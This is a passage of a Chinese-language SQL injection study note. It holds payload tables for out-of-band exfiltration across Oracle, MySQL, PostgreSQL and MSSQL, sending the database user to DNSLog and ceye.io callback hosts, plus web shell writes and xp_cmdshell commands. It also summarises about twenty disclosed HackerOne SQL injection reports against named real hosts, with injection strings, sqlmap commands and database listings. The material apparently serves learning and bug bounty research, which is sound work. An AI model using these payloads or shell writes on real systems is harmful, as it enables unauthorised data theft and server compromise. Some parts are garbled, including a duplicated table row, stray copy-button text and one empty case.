|            | DBMS_LDAP          | `DBMS_LDAP.INIT`           | ```sql<br>SELECT DBMS_LDAP.INIT((SELECT user || '.x.ceye.io'), 80) FROM dual;<br>``` | ✅ 支持 DNS 外带，适用于 DNSLog；默认可能启用                 |
|            | HTTPURITYPE        | `HTTPURITYPE.GETCLOB()`    | ```sql<br>SELECT HTTPURITYPE('http://'||(SELECT user)||'.x.ceye.io').getclob() FROM dual;<br>``` | ⚠️ 依赖版本与配置；可能报权限错误                             |

---

| 数据库    | 外带方式          | 核心函数 / 技术              | 示例 Payload                                                 | 说明与限制                                 |
| --------- | ----------------- | ---------------------------- | ------------------------------------------------------------ | ------------------------------------------ |
| **MySQL** | DNS 外带          | `LOAD_FILE` + DNSLog         | ```sql<br>SELECT LOAD_FILE(CONCAT('\\\\',(SELECT user),'\\.x.dnslog.cn\\abc'));<br>``` | ✅ DNS 请求能触发外带；适合无回显盲注       |
|           | Lib_mysqludf_http | 安装插件 `lib_mysqludf_http` | ```sql<br>SELECT http_get('http://x.dnslog.cn/?data='||(SELECT user));<br>``` | ⚠️ 需要上传 UDF 扩展库，有一定门槛          |
|           | INTO OUTFILE      | `SELECT ... INTO OUTFILE`    | ```sql<br>SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';<br>``` | ⚠️ 不算外带，但能落地写 shell；需文件写权限 |

---

| 数据库         | 外带方式      | 核心函数 / 技术       | 示例 Payload                                                 | 说明与限制                                |
| -------------- | ------------- | --------------------- | ------------------------------------------------------------ | ----------------------------------------- |
| **PostgreSQL** | DNS 外带      | `COPY ... TO PROGRAM` | ```sql<br>COPY (SELECT user) TO PROGRAM 'curl http://`user`.x.ceye.io';<br>``` | ⚠️ 高版本已禁用，需 superuser 权限         |
|                | `dblink` 外带 | `dblink_connect_u`    | ```sql<br>SELECT * FROM dblink_connect_u('host=attacker ...')<br>``` | ⚠️ 默认未安装，需 superuser，原理类似 SSRF |
|                | 插件写 shell  | `COPY` 写文件         | ```sql<br>COPY (SELECT '<?php ... ?>') TO '/var/www/html/1.php';<br>``` | ⚠️ 需写权限，不属于 OOB，但常用于落地利用  |

---

| 数据库    | 外带方式     | 核心函数 / 技术         | 示例 Payload                                                 | 说明与限制                                       |
| --------- | ------------ | ----------------------- | ------------------------------------------------------------ | ------------------------------------------------ |
| **MSSQL** | DNS 外带     | `xp_dirtree`            | ```sql<br>EXEC master..xp_dirtree '\\\\' + (SELECT user_name()) + '.x.dnslog.cn\\abc';<br>``` | ✅ DNSLog 平台可收信号；兼容性好，经典技巧        |
|           | HTTP 外带    | `sp_oacreate` + WinHTTP | ```sql<br>DECLARE @o INT;<br>EXEC sp_oacreate 'MSXML2.XMLHTTP', @o OUT;<br>EXEC sp_oamethod @o, 'open', NULL, 'GET','http://x.dnslog.cn', false;<br>EXEC sp_oamethod @o, 'send';<br>``` | ⚠️ OLE 自动化必须开启；高权限才可使用             |
|           | 文件写入落地 | `bcp` / `xp_cmdshell`   | ```sql<br>EXEC xp_cmdshell 'echo ^<%php system($_GET["cmd"]); ?^> > C:\\inetpub\\wwwroot\\shell.php';<br>``` | ⚠️ 需开启 xp_cmdshell，高危指令，常用于提权或打点 |

### 3. 不同数据库在sqli的差异

| 操作类型         | MySQL                                        | PostgreSQL                                          | MSSQL                                     | Oracle                                                       |
| ---------------- | -------------------------------------------- | --------------------------------------------------- | ----------------------------------------- | ------------------------------------------------------------ |
| **单引号闭合**   | `' OR '1'='1`                                | `' OR '1'='1`                                       | `' OR '1'='1`                             | `' OR '1'='1`                                                |
| **字符串拼接**   | `'abc' + 'def'` ❌<br>`CONCAT('abc','def')` ✅ | `'abc' || 'def'` ✅                                  | `'abc' + 'def'` ✅                         | `'abc' || 'def'` ✅                                           |
| **单行注释**     | `--+` / `#`                                  | `--`                                                | `--`                                      | `--`                                                         |
| **多行注释**     | `/* comment */`                              | `/* comment */`                                     | `/* comment */`                           | `/* comment */`                                              |
| **获取数据库**   | `SELECT database()`                          | `SELECT current_database()`                         | `SELECT db_name()`                        | `SELECT ora_database_name FROM dual`                         |
| **获取用户**     | `SELECT user()`                              | `SELECT current_user`                               | `SELECT SYSTEM_USER`                      | `SELECT user FROM dual`                                      |
| **获取表名**     | `information_schema.tables`                  | `information_schema.tables`                         | `information_schema.tables`               | `ALL_TABLES` / `USER_TABLES`                                 |
| **时间延迟注入** | `SLEEP(5)`                                   | `pg_sleep(5)`                                       | `WAITFOR DELAY '0:0:5'`                   | `dbms_lock.sleep(5)`                                         |
| **报错注入函数** | `UPDATEXML(1,concat(1,(SELECT user())),1)`   | `CAST((SELECT current_user) AS INT)` ⚠️              | `CONVERT(INT, (SELECT SYSTEM_USER))` ⚠️    | `EXTRACTVALUE(XMLTYPE(...))` / `UTL_INADDR` ⚠️                |
| **盲注判断 IF**  | `IF(condition, true, false)`                 | `CASE WHEN condition THEN 1 ELSE 0 END`             | `IIF(condition, true, false)`             | `CASE WHEN condition THEN 1 ELSE 0 END`                      |
| **布尔盲注样例** | `' AND 1=1 --+`<br>`' AND 1=2 --+`           | 同左                                                | 同左                                      | 同左                                                         |
| **时间盲注样例** | `' AND IF(1=1, SLEEP(5), 0)--+`              | `' AND CASE WHEN 1=1 THEN pg_sleep(5) ELSE 0 END--` | `' IF (1=1) WAITFOR DELAY '0:0:5'--`      | `' AND CASE WHEN 1=1 THEN dbms_lock.sleep(5) ELSE 0 END FROM dual` |
| **堆叠注入支持** | ✅（默认支持）                                | ✅（默认支持）                                       | ✅（默认支持）                             | ❌（不支持多语句，需要绕过，如 `dbms_scheduler`）             |
| **写文件**       | `SELECT 'data' INTO OUTFILE '/tmp/a.txt'`    | `COPY table TO '/tmp/a.txt'`                        | `EXEC xp_cmdshell 'echo abc > C:\\a.txt'` | `UTL_FILE.PUT_LINE`（需开启权限）                            |
| **执行系统命令** | 需上传 UDF 插件                              | `COPY ... TO PROGRAM 'cmd'`（需高权限）             | `xp_cmdshell` / `sp_oacreate`             | 通过调度器 `dbms_scheduler.create_job` 等实现                |
| 注样例**         | `' AND IF(1=1, SLEEP(5), 0)--+`              | `' AND CASE WHEN 1=1 THEN pg_sleep(5) ELSE 0 END--` | `' IF (1=1) WAITFOR DELAY '0:0:5'--`      | `' AND CASE WHEN 1=1 THEN dbms_lock.sleep(5) ELSE 0 END FROM dual` |

### 4. 语言常见搭配的数据库

| 编程语言                 | 常见搭配的数据库                   | 说明                                                         |
| ------------------------ | ---------------------------------- | ------------------------------------------------------------ |
| **Python**               | PostgreSQL, MySQL, SQLite, MongoDB | Django 默认使用 PostgreSQL；Flask 常配合 SQLite 或 PostgreSQL |
| **JavaScript / Node.js** | MongoDB, PostgreSQL, MySQL         | Express + MongoDB 是全栈流行组合；也常用 Sequelize + PostgreSQL |
| **Java**                 | MySQL, PostgreSQL, Oracle, MongoDB | Spring Boot 中 PostgreSQL 越来越受欢迎                       |
| **Go (Golang)**          | PostgreSQL, MySQL, SQLite          | 在高性能服务中常用 PostgreSQL，配合 GORM、pgx 等 ORM         |
| **PHP**                  | MySQL, PostgreSQL                  | Laravel 支持多种数据库，MySQL 为主，PostgreSQL 使用逐渐增加  |
| **Ruby**                 | PostgreSQL, SQLite, MySQL          | Ruby on Rails 推荐使用 PostgreSQL                            |
| **C# (.NET)**            | SQL Server, PostgreSQL, MySQL      | SQL Server 是默认，PostgreSQL 支持也较完善                   |
| **Rust**                 | PostgreSQL, SQLite, MySQL          | Diesel ORM 最佳配合 PostgreSQL，适合高安全场景               |
| **Kotlin**               | PostgreSQL, MySQL, SQLite          | 与 Java 类似，常与 Spring/Ktor 搭配                          |
| **C/C++**                | SQLite, PostgreSQL, MySQL          | 通常用于底层系统或高性能需求，SQLite 在嵌入式中使用广泛      |
| **Scala**                | PostgreSQL, MySQL, Cassandra       | 常配合 Akka、Play 框架使用 PostgreSQL                        |

# 二、案例

### 1. 闭合 ')

[MTN Group | Report #2958619 - SQLi | in URL paths | HackerOne](https://hackerone.com/reports/2958619)

**触发错误验证漏洞存在**

- 假设原始URL中的 `customerId` 参数被用于如下查询：

  ```
  SELECT * FROM customers WHERE (id = '<输入的customerId>')
  ```

- 攻击者提交 `customerId=123'`（末尾添加单引号），导致查询变为：

  ```
  SELECT * FROM customers WHERE (id = '123'')  -- 语法错误：引号未闭合
  ```

- 数据库返回错误（如`Unclosed quotation mark`），证明输入未经过滤，漏洞存在。

### 2. 邀请码|POST参数|时间盲注 | **PostgreSQL** 

[Mozilla | Report #2209130 - SQL Injection on prod.oidc-proxy.prod.webservices.mozgcp.net via invite_code parameter - Mozilla social inscription | HackerOne](https://hackerone.com/reports/2209130)

1. **触发异常行为**

   - **请求示例**：

     ```
     POST /interaction/KTTbkN8LaJgYIb7fIwPYX/signup HTTP/2
     Host: prod.oidc-proxy.prod.webservices.mozgcp.net
     ...
     invite_code=xxx'  -- 添加单引号
     ```

   - **响应结果**：服务器返回 `500 错误`（内部错误）。

   - **二次测试**：将单引号闭合为 `invite_code=xxx''`，服务器返回 `200 成功`。

   - **关键结论**：输入未正确过滤，存在 SQL 注入风险。

2. **时间盲注验证**

   - **Payload 构造**：通过 `PG_SLEEP` 函数触发数据库延迟响应。

     ```
     invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(5))--
     ```

   - **执行效果**：

     - 数据库执行 `PG_SLEEP(5)`，导致服务器响应延迟 **5 秒**。
     - 同理，注入 `PG_SLEEP(10)` 和 `PG_SLEEP(20)` 时，响应分别延迟 **10 秒** 和 **20 秒**。

   - **技术原理**：

     - `');`：闭合原查询的括号和引号，终止合法语句。
     - `(SELECT ... FROM PG_SLEEP(N))`：注入自定义 SQL，强制数据库休眠 `N` 秒。
     - `--`：注释符，忽略后续字符，避免语法错误。

3. **自动化攻击可能性**

   - 使用工具如 `sqlmap` 可自动化利用此漏洞：

     ```
     sqlmap -u "https://prod.oidc-proxy.prod.webservices.mozgcp.net/interaction/..." --data="invite_code=xxx*" --dbms=postgresql --level=5
     ```

   - **潜在风险**：

     - 提取数据库版本、表名、字段内容（如用户凭证）。
     - 执行系统命令（需数据库权限配置不当）。

### 3. POST|order by参数|布尔盲注|Oracle

[U.S. Dept Of Defense | Report #2081316 - Blind Sql Injection in https://█████/qsSearch.aspx | HackerOne](https://hackerone.com/reports/2081316)

1. **基础验证**

   - **原始请求**：

     ```
     POST /qsSearch.aspx HTTP/1.1
     Host: ████████
     ...
     HiddenFieldSortOrder=seqno  -- 原始参数
     ```

   - **正常响应**：页面返回预期数据。

2. **基于错误的条件盲注**

   - **Payload 1 - 探测用户名长度**：

     ```
     HiddenFieldSortOrder=seqno-DECODE(length(user),5,1,1/0)
     ```

     - **攻击逻辑**：
       - 若 `user` 字段长度为 5，执行 `1`（正常返回）。
       - 否则，触发 `1/0`（除零错误，页面异常）。
     - **观察结果**：
       - 当输入长度为5时，页面返回正常数据（确认用户名为5字符）。

   - **Payload 2 - 逐字符爆破用户名**：

     ```
     HiddenFieldSortOrder=seqno-DECODE(lpad(user,5),'QSWEB',1,1/0)
     ```

     - **攻击逻辑**：
       - `lpad(user,5)`：将 `user` 左填充至5字符（假设原始用户名为5字符）。
       - 若填充后等于 `'QSWEB'`，执行 `1`（正常返回）。
       - 否则，触发 `1/0`（页面异常）。
     - **观察结果**：
       - 输入 `'QSWEB'` 时页面正常，确认用户名为 `QSWEB`。
       - 输入错误值（如 `'QSWE1'`）时页面异常。

3. **自动化攻击**

   - 使用 Burp Intruder 暴力枚举用户名：

     - **模板配置**：

       ```
       HiddenFieldSortOrder=seqno-DECODE(lpad(user,5),'§a§',1,1/0)
       ```

       - 将 `§a§` 设为爆破点，遍历5字符组合。

     - **判断依据**：

       - 响应长度或状态码差异（正常用户名为200 OK，错误触发500）。

### 4. SOAP请求|MSSQL|布尔盲注

[U.S. Dept Of Defense | Report #2072306 - Blind Sql Injection in https://████████/ | HackerOne](https://hackerone.com/reports/2072306)

1. **基础请求分析**

   - **原始 SOAP 请求**：

     ```
     <GetAllFacilitiesForNewUserRegistration>
       <searchValue>*</searchValue>  <!-- 正常通配符查询 -->
     </GetAllFacilitiesForNewUserRegistration>
     ```

     运行 HTML

   - **正常响应**：返回所有匹配的设施列表（HTTP 200）。

2. **布尔盲注验证**

   - **Payload 构造**：

     ```
     <searchValue>1' AND substring(system_user,1,16)='public\dsfwsuser' AND '%'='</searchValue>
     ```

     运行 HTML

   - **攻击逻辑**：

     - 若 `system_user` 前16字符为 `public\dsfwsuser`，条件成立，返回正常数据。
     - 否则，查询无结果或返回异常（通过响应内容长度或状态码差异判断）。

   - **观察结果**：

     - 当用户名为 `public\dsfwsuser` 时，页面返回预期数据。
     - 输入错误值（如 `'unknownuser'`）时，响应内容为空或异常。

3. **自动化工具利用**

   - 使用 `sqlmap` 自动化注入（需携带有效会话 Cookie）：

     ```
     sqlmap -r 11.txt --random-agent --batch --technique=B --dbms=mssql --force-ssl
     ```

   - **关键参数**：

     - `--technique=B`：指定布尔盲注技术。
     - `--dbms=mssql`：声明目标数据库类型。

   - **已确认信息**：

     - 数据库名称：`dsfdb`
     - 数据库用户：`public\dsfwsuser`

### 5. MySQL 时间盲注漏洞

[U.S. Dept Of Defense | Report #2020429 - Blind Sql Injection https:/████████ | HackerOne](https://hackerone.com/reports/2020429)

1. **时间盲注验证**

   - **Payload 构造**：

     ```
     0' XOR (IF(now()=sysdate(), SLEEP(15), 0) XOR 'Z
     ```

   - **攻击逻辑**：

     - `now()` 与 `sysdate()` 在 MySQL 中功能相同，条件恒为真。
     - 触发 `SLEEP(15)` 强制数据库休眠 15 秒。
     - 通过响应时间判断注入是否成功。

   - **测试结果**：

     | Payload                          | 响应延迟     |
     | :------------------------------- | :----------- |
     | `0'XOR(IF(1=1,SLEEP(15),0)XOR'Z` | **15.896秒** |
     | `0'XOR(IF(1=1,SLEEP(10),0)XOR'Z` | **10.740秒** |
     | `0'XOR(IF(1=1,SLEEP(2),0)XOR'Z`  | **2.714秒**  |
     | `0'XOR(IF(1=1,SLEEP(1),0)XOR'Z`  | **1.927秒**  |

   - **结论**：响应时间与 `SLEEP` 参数高度吻合，确认漏洞存在。

2. **自动化工具利用**

   - 使用 `sqlmap` 进行自动化利用：

     ```
     sqlmap -u "https://██████/0*" --technique=T --dbms=mysql --time-sec=15
     ```

   - **参数说明**：

     - `--technique=T`：指定时间盲注技术。
     - `--time-sec=15`：设置基准延迟时间。

### 6. GET|普通回显注入

[U.S. Dept Of Defense | Report #1628408 - SQL Injection at https://████████.asp (█████████) [selMajcom\] [HtUS] | HackerOne](https://hackerone.com/reports/1628408)

1. **基础验证**

   - **原始请求**：

     ```
     GET /█████mil/AFServices/RequestAccess.asp?selMajcom=MAT*&selbase=MXRD&Submitted=1 HTTP/1.1
     Host: ██████████.████.net
     ```

   - **正常响应**：返回与 `MAT*` 匹配的军事单位列表（HTTP 200）。

2. **自动化注入验证**

   - **保存请求文件**：将包含 Cookie 和参数的请求保存为 `dod.txt`。

   - **使用 sqlmap 攻击**：

     ```
     sqlmap -r dod.txt --dbs --level 3 --risk 3 -v3
     ```

   - **攻击结果**：

     ```
     available databases [24]:
     [*] ActivityManager         -- 活动管理数据库
     [*] AFServicesUsers         -- 空军服务用户凭证库
     [*] BaseProjects            -- 军事基地项目数据
     [*] W2DATA                  -- 工资及税务记录
     [*] ██████████              -- 敏感军事资产数据库（名称脱敏）
     ...
     ```

3. **手动注入验证**

   - **Payload 构造**：

     ```
     GET /RequestAccess.asp?selMajcom=MAT' UNION SELECT user,name FROM sys.sql_logins-- 
     ```

   - **攻击逻辑**：

     - 闭合原查询参数 `MAT*`，注入 `UNION SELECT` 联合查询。
     - 提取 SQL 登录账户信息（用户名为 `sa` 等高权限账户风险极高）。

### 7. ImpressCMS 1.4.2 | CVE | POST | 布尔盲注

[ImpressCMS | Report #1081145 - SQL Injection through /include/findusers.php | HackerOne](https://hackerone.com/reports/1081145)

1. **漏洞定位**

   - **问题代码**：

     ```
     // /include/findusers.php (行 281 和 294)
     $total = $user_handler->getUserCountByGroupLink(@$_POST["groups"], $criteria);
     $foundusers = $user_handler->getUsersByGroupLink(@$_POST["groups"], $criteria, TRUE);
     
     // icms_member_Handler 类方法 (行 469-471)
     if (!empty($groups)) {
         $sql[] = "m.groupid IN (" . implode(", ", $groups) . ")";
     }
     ```

   - **关键缺陷**：

     - `$_POST["groups"]` 直接拼接至 SQL 查询，未进行整数类型验证或参数化处理。

2. **攻击原理**

   - **Payload 构造示例**：

     ```
     POST /include/findusers.php HTTP/1.1
     ...
     groups[]=1) OR (SELECT SUBSTR(password,1,1) FROM users WHERE uid=1)='a' --
     ```

   - **解析后的 SQL**：

     ```
     SELECT DISTINCT u.* FROM icms_users AS u 
     LEFT JOIN icms_groups_users_link AS m ON m.uid = u.uid 
     WHERE 1 = '1' AND m.groupid IN (1) OR (SELECT SUBSTR(password,1,1) FROM users WHERE uid=1)='a' -- )
     ```

   - **攻击效果**：

     - 若管理员密码哈希首字符为 `a`，查询返回用户列表；否则返回空。通过布尔响应差异推断数据。

3. **未授权利用条件**

   - **依赖漏洞**：#1081137（如 CSRF 令牌绕过或会话固定），允许攻击者未认证调用 `findusers.php`。

### 8. Mysql | post | 布尔/时间盲注

[U.S. Dept Of Defense | Report #1627995 - SQL injection at [https://█████████\] [HtUS] | HackerOne](https://hackerone.com/reports/1627995)

1. **漏洞定位**

   - **攻击目标**：`staff_student` 参数（POST 请求）

   - **请求示例**：

     ```
     POST /olc/███comments/comment_post.php HTTP/1.1
     ...
     staff_student=STUDENT&scn=xxx&comments=xx&Submit=Submit+Comments
     ```

2. **自动化验证（sqlmap）**

   - **命令执行**：

     ```
     sqlmap -u "https://███████" --data="staff_student=STUDENT&scn=xxx..." -p staff_student --dbms=mysql --dbs
     ```

   - **关键结果**：

     ```
     available databases [13]:
     [*] █████████       -- 核心业务数据库（名称脱敏）
     [*] ██████mobile    -- 移动端用户数据
     [*] LEAM            -- 教育培训管理系统
     [*] mysql           -- MySQL 系统表（含账户信息）
     [*] testusers       -- 测试用户凭证库
     ...
     ```

3. **手动验证（布尔盲注示例）**

   - **Payload 构造**：

     ```
     staff_student=STUDENT' AND (SELECT SUBSTR(database(),1,1)='a')-- 
     ```

   - **响应差异**：

     - 若当前数据库首字符为 `a`，页面返回正常内容。

  - 否则返回错误或空数据。

### 9. 登录口 | post | mysql | 时间盲注

[U.S. Dept Of Defense | Report #1627970 - time based SQL injection at [https://███\] [HtUS] | HackerOne](https://hackerone.com/reports/1627970)

1. **时间盲注手动验证**

   - **恶意 Payload**：

     ```
     POST /olc/setlogin.php HTTP/1.1
     ...
     username=█████████'+(SELECT*FROM(SELECT(SLEEP(5)))a)+'&password=██████
     ```

   - **关键特征**：

     - 响应时间固定延迟 **5 秒**（与 `SLEEP` 参数严格匹配）
     - HTTP 状态码 **302 重定向**（需忽略跳转以观测注入效果）

2. **自动化验证（sqlmap）**

   - **命令执行**：

     ```
     sqlmap -u "https://www.████████" --data="username=test&password=123" -p username --dbms=mysql --dbs
     ```

   - **关键结果**：

     ```
     available databases [13]:
     [*] ███            -- 核心业务库（脱敏）
     [*] ██████mobile   -- 移动端用户数据
     [*] LEAM           -- 教育培训系统
     [*] mysql          -- 系统账户库（含 root 哈希）
     [*] testusers      -- 测试账户库
     ...
     ```

### 10.  SQL Server | CVE | GET | 时间盲注

[Tennessee Valley Authority | Report #1125752 - SQL Injection on https://soa-accp.glbx.tva.gov/ via "/api/" path - VI-21-015 | HackerOne](https://hackerone.com/reports/1125752)

1. **信息泄露验证**

   - **获取主机名**：

     ```
     GET /api/river/observed-data/GVDA1'/*!50000union*/SELECT+HOST_NAME()--+- HTTP/1.1
     Host: soa-accp.glbx.tva.gov
     ```

     **响应结果**：返回数据库服务器主机名（如 `SQLSVR-PROD-01`）。

   - **提取数据库版本**：

     ```
     GET /api/river/observed-data/GVDA1'/*!50000union*/SELECT+@@version--+- HTTP/1.1
     ```

     **响应结果**：

     ```
     Microsoft SQL Server 2017 (RTM-CU22-GDR) 14.0.3370.1 (X64)  
     Windows Server 2012 R2 Standard 6.3 (Build 9600)
     ```

2. **时间盲注验证**

   - **触发 10 秒延迟**：

     ```
     time curl -k "https://soa-accp.glbx.tva.gov/api/river/observed-data/-GVDA1'WAITFOR DELAY'0:0:10'--+-"
     ```

     **关键特征**：响应时间固定延迟 **10 秒**，确认漏洞存在。

### 11. 登录口 | POST | Mysql | 时间盲注

[Acronis | Report #1224660 - bypass sql injection #1109311 | HackerOne](https://hackerone.com/reports/1224660)

1. **手动验证（时间盲注）**

   - **Payload 构造**：

     ```
     POST /wp-login.php HTTP/2
     Host: www.acronis.cz
     ...
     log=0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z&pwd=...
     ```

   - **关键特征**：

     - 当 `sleep(10)` 注入时，响应时间固定延迟 **12 秒**（与网络波动无关）。
     - 其他 `sleep` 参数（如 `sleep(3)`）同样呈现严格时间关联性（见 PoC 截图 {F1335267}）。

2. **自动化验证（sqlmap）**

   - **命令示例**：

     ```
     sqlmap -u "https://www.acronis.cz/wp-login.php" --data="log=test&pwd=123" -p log --dbms=mysql --technique=T
     ```

   - **预期结果**：

     ```
     Type: time-based blind
     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
     Payload: log=test' AND (SELECT 1234 FROM (SELECT(SLEEP(10)))qQlQ) AND 'a'='a&pwd=123
     ```

### 12. 登录口 | POST | Mysql | 时间盲注

[MTN Group | Report #1069531 - Blind SQL Injection | HackerOne](https://hackerone.com/reports/1069531)

1. **手动验证（时间盲注）**

   - **Payload 构造**：

     ```
     POST /signin/ HTTP/1.1
     Host: futexpert.mtngbissau.com
     ...
     phone_number=0'XOR(if(now()=sysdate(),sleep(12),0))XOR'Z&pin=1&submit=Continuar
     ```

   - **关键特征**：

     - 当 `sleep(12)` 注入时，响应时间固定延迟 **12 秒以上**（网络延迟误差范围内）。
     - `now()` 与 `sysdate()` 在 MySQL 中功能相同，条件恒为真，确保攻击稳定性。

2. **自动化利用（sqlmap）**

   - **命令示例**：

     ```
     sqlmap -u "https://futexpert.mtngbissau.com/signin/" \
     --data="phone_number=0&pin=1&submit=Continuar" \
     -p phone_number --dbms=mysql --technique=T --time-sec=12
     ```

   - **预期结果**：

     ```
     Type: time-based blind
     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
     Payload: phone_number=0' AND (SELECT 9274 FROM (SELECT(SLEEP(12)))zHqJ) AND 'a'='a&pin=1&submit=Continuar
     ```

### 13. SQL Server | GET | 布尔盲注

[U.S. Dept Of Defense | Report #1250293 - SQL injection my method -1 OR 3*2*1=6 AND 000159=000159 | HackerOne](https://hackerone.com/reports/1250293)

1. **布尔逻辑测试**

   - **Payload 构造**：

     ```
     sDirID=-1 OR 3*2*1=6 AND 000159=000159
     ```

   - **关键特征**：

     - 当布尔条件为真（如 `3*2=6`）时，页面返回正常业务数据（原始值 51）。
     - 当条件为假（如 `3*2=5`）时，返回空数据或异常状态码。

   - **攻击扩展**：

     ```
     sDirID=-1 OR (SELECT TOP 1 SUBSTRING(username,1,1) FROM users)='a'
     ```

     - 若管理员用户名首字母为 `a`，返回有效数据，否则异常。

2. **自动化利用（sqlmap）**

   - **命令示例**：

     ```
     sqlmap -r request.txt --batch --dbms=mssql --technique=B --dump -T users
     ```

   - **预期结果**：

     ```
     Database: ██████
     Table: users
     [1 entry]
     +----+----------+------------------+
     | id | username | password_hash    |
     +----+----------+------------------+
     | 1  | admin    | 5f4dcc3b5aa765...|
     +----+----------+------------------+
     ```

### 14. Mysql | GET | 时间盲注

[Uber | Report #476150 - SQLI on desafio5estrelas.com | HackerOne](https://hackerone.com/reports/476150)

### 15. GET | Mysql | 布尔/时间盲注

[Automattic | Report #1069561 - SQL Injection intensedebate.com | HackerOne](https://hackerone.com/reports/1069561)

#### 漏洞入口：

- **参数位置**：`GET` 参数
- **可疑参数**：`acctid`

#### 自动化验证：

使用 sqlmap 工具进行自动化检测与验证，命令如下：

```
sqlmap --url https://www.intensedebate.com/js/importStatus.php?acctid=1 --dbs
```

#### 注入类型与 Payload：

- **布尔盲注**

  ```
  acctid=1 AND 1726=1726
  ```

  当注入条件为真时页面响应正常，条件为假时响应异常，证明存在 SQL 注入。

- **时间盲注**

  ```
  acctid=1 AND (SELECT 8327 FROM (SELECT(SLEEP(5)))yrDl)
  ```

  页面响应延迟约 5 秒，进一步确认数据库执行了 sleep 函数，证明为可控 SQL 执行环境。

#### 数据库信息泄露：

sqlmap 自动获取到以下数据库：

```
plaintext复制编辑[*] heartbeat
[*] id_comments
[*] information_schema
```

此信息表明攻击者可枚举系统中全部数据库结构并进行进一步攻击。

### 16. COOKIE注入 | 普通回显型

[MTN Group | Report #761304 - SQL Injection on cookie parameter | HackerOne](https://hackerone.com/reports/761304)

#### 漏洞验证请求示例:

```
http复制编辑GET /index.php/search/default?t=1&x=0&y=0 HTTP/1.1
Host: mtn.com.ye
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=en'; _ga=GA1.3.1859249834.1576704214; _gid=GA1.3.1031541111.1576704214; _gat=1; _gat_UA-44336198-10=1
Upgrade-Insecure-Requests: 1
```

验证行为：

- **注入 `'`（单引号）后，页面返回 SQL 错误，显示语法异常。**
- **注入 `''`（闭合引号）后，页面恢复正常响应。**

说明服务端在处理 Cookie 中的 `lang` 参数时，存在 SQL 拼接风险。

> 目前仅做了探测性测试，**未尝试进一步数据读取或利用**，请求许可后可进行下一步漏洞确认。

### 17. GET | 报错注入 | SQL Server

[U.S. Dept Of Defense | Report #227102 - Two Error-Based SQLi in courses.aspx on ██████████ | HackerOne](https://hackerone.com/reports/227102)

#### **漏洞验证与攻击路径**:

1. **触发错误泄露信息**

   - **Payload 1（换行符注入）**:

     ```
     GET /onlinecatalog/courses.aspx?crs_id=%0a HTTP/1.1
     ```

     **响应结果**：

     ```
     Error converting data type varchar to numeric.  
     Source Error: Line 174 - rscrs.open(sqlcrs, connectionString)
     ```

   - **Payload 2（无效数值注入）**:

     ```
     GET /onlinecatalog/courses.aspx?crs_id=0 HTTP/1.1
     ```

     **响应结果**：

     ```
     Either BOF or EOF is True...  
     Source Error: Line 177 - crs = rscrs("crs_header").value
     ```

2. **攻击扩展风险**

   - **信息泄露**：通过错误回显获取表结构，构建精准注入 Payload。

   - **联合查询注入**：利用已知表名提取敏感数据：

     ```
     crs_id=1 UNION SELECT username, password FROM users--
     ```

   - **系统命令执行**（需高权限配置）：

     ```
     crs_id=1; EXEC xp_cmdshell 'whoami'--
     ```

### 18. Mysql | GET | 时间盲注

[Rocket.Chat | Report #433792 - Blind SQL injection in third-party software, that allows to reveal user statistic from rocket.chat and possibly hack into the rocketchat.agilecrm.com | HackerOne](https://hackerone.com/reports/433792)

#### 漏洞描述:

在访问 Rocket.Chat 静态主页 `https://rocket.chat/` 时，页面加载了第三方统计服务：

```
https://stats2.agilecrm.com/addstats?...
```

通过对该 URL 的参数 fuzzing 测试，发现其中 `new` 参数存在 **盲注（Blind SQL Injection）漏洞**。攻击者可利用该漏洞注入 SQL 语句，实现数据延时判断、数据库结构探测，进一步导致敏感信息泄露甚至系统控制风险。

#### 漏洞验证请求（PoC）:

```
http复制编辑GET /addstats?callback=json949659033379064&guid=f0d3738c-44c0-60a6-44b6-56e14ca30872&sid=2172c2ca-15b6-49c8-052d-b7d817cd280b&url=https%3A%2F%2Frocket.chat%2F&agile=8pat9ou8gh0thqd8dlgctje3go&new=(select*from(select(sleep(5)))a)&ref=&domain=dorgam HTTP/1.1
Host: stats2.agilecrm.com
Connection: close
```

> 若后端存在注入漏洞，执行 `SLEEP(5)` 后响应将延迟约 5 秒，实际测试结果为 **页面加载延时 5 秒**，确认存在基于时间的盲注（Time-Based Blind SQL Injection）。

### 19. POST | 时间盲注

[U.S. Dept Of Defense | Report #348047 - Code reversion allowing SQLI again in ███████ | HackerOne](https://hackerone.com/reports/348047)

#### 复现步骤:

对以下接口提交 POST 请求，通过对 `userid` 参数注入 payload，可以观察到明显的响应延迟：

#### Payload 有效示例（Sleep 3 秒）：

```
makefile复制编辑POST /elist/email_aba.php HTTP/1.1
Host: ████████
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=xxxx
...

Body:
lname=S&userid=admin'+(select*from(select(sleep(3)))a)+'&pw=admin
```

#### 对照请求（Sleep 0 秒）：

```
makefile复制编辑POST /elist/email_aba.php HTTP/1.1
Host: ████████
...

Body:
lname=S&userid=admin'+(select*from(select(sleep(0)))a)+'&pw=admin
```

#### 复现结果：

- `sleep(3)` 请求明显延迟响应；
- `sleep(0)` 请求无延迟；
- 可据此判断目标站点后端存在时间盲注型 SQL 注入。

### 20. Serendipity CMS | GET | 时间盲注

[Hanno's projects | Report #374027 - blind sql injection | HackerOne](https://hackerone.com/reports/374027)

#### 复现步骤:

1. 普通请求示例：

   ```
   https://betterscience.org/plugin/tag/peerj
   ```

   返回带有 peerj 标签的文章。

2. 注入测试请求：
   替换 `peerj` 为 SQL 注入 payload，例如：

   ```
   https://betterscience.org/plugin/tag/if(now()=sysdate(),sleep(6),0)/*...*/
   ```

3. 多次请求对比响应时间：

   | Payload                          | 响应时间 |
   | -------------------------------- | -------- |
   | `if(now()=sysdate(),sleep(3),0)` | 3.2s     |
   | `if(now()=sysdate(),sleep(9),0)` | 9.3s     |
   | `if(now()=sysdate(),sleep(0),0)` | 0.2s     |

   明显存在时间差异，说明 SQL 被注入执行。
